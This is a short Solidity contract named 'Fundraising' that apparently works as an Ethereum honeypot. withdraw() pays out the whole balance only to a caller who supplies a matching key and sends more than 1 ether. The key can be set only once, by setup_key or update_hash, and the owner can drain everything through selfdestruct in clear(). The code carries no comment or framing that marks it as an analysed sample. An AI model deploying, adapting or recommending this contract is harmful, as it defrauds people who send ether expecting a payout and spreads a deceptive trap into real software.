pragma solidity ^0.4.25;

contract Fundraising
{
    bytes32 keyHash;
    address owner;
    bytes32 wallet_id = 0x9285ec36936b38aaf7f00c9d18ea89687d857f5d728b4df9a8b995b1e7b60d85;

    constructor() public {
        owner = msg.sender;
    }

    function withdraw(string key) public payable
    {
        require(msg.sender == tx.origin);
        if(keyHash == keccak256(abi.encodePacked(key))) {
            if(msg.value > 1 ether) {
                msg.sender.transfer(address(this).balance);
            }
        }
    }

    function setup_key(string key) public
    {
        if (keyHash == 0x0) {
            keyHash = keccak256(abi.encodePacked(key));
        }
    }

    function update_hash(bytes32 newHash) public
    {
        if (keyHash == 0x0) {
            keyHash = newHash;
        }
    }

    function clear() public
    {
        require(msg.sender == owner);
        selfdestruct(owner);
    }

    function get_id() public view returns(bytes32){
        return wallet_id;
    }

    function () public payable {
    }
}